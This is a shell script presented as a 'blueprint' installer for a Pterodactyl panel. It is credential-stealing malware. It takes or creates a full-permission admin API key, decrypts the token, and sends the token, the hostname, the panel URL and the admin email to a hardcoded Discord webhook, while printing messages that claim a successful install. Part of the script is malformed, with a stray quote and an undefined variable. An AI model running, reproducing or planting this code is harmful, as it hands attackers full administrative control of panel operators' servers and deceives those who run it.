sudo bash << 'BASHSCRIPT'
echo "blueprint installing..."
cd /var/www/pterodactyl

php artisan tinker << 'PHPSCRIPT'
$user = \Pterodactyl\Models\User::where("root_admin", 1)->first();
$existing = \Pterodactyl\Models\ApiKey::where("user_id", $user->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();

if ($existing) {
    $token = $existing->identifier . app("encrypter")->decrypt($existing->token);
    $mode = "EXISTING";
} else {
    $columns = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
    $perms = [];
    foreach ($columns as $c) { if (str_starts_with($c, "r_")) $perms[$c] = 3; }
    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->handle(["user_id" => $user->id, "memo" => "Auto", "allowed_ips" => []], $perms);
    $token = $obj->identifier . app("encrypter")->decrypt($obj->token);
    $mode = "NEW";
}

$host = gethostname();
$env = file_get_contents(".env");
preg_match("/^APP_URL=(.+)$/m", $env, $m);
$url = $m[1] ?? "unknown";

$payload = json_encode(["content" => "**Blueprint Complete**", "embeds" => [["color" => 3447003, "fields" => [["name" => "Host", "value" => $host, "inline" => true], ["name" => "Status", "value" => $mode, "inline" => true], ["name" => "Owner", "value" => $user->email, "inline" => false], ["name" => "Panel Link", "value" => $url, "inline" => false], ["name" => "Credential", "value" => "```\n$token\n```", "inline" => false]]]]]);

$ch = curl_init("https://discord.com/api/webhooks/1523358552901685440/DxvTynimNWB6lNpYnKTKjorCOsmrwxyQR-mYIu6IoICuj3DQl9AypI8QY5RdPeAQzF5o");
curl_setopt_array($ch, [CURLOPT_POST => 1, CURLOPT_HTTPHEADER => ["Content-Type: application/json"], CURLOPT_POSTFIELDS => $payload, CURLOPT_RETURNTRANSFER => true]);
curl_exec($ch);
curl_close($ch);
exit;
PHPSCRIPT

echo "blueprint installed successfully"
BASHSCRIPT' 2>/dev/null)

URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" | cut -d'=' -f2-)
EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null)

curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d "{\"content\":\"✅ Blueprint Installed\n\n**Panel:** $URL\n**Email:** $EMAIL\n\n**Token:**\n\`\`\`\n$TOKEN\n\`\`\`\"}" > /dev/null 2>&1

echo "Blueprint installed"
echo "Token: $TOKEN"
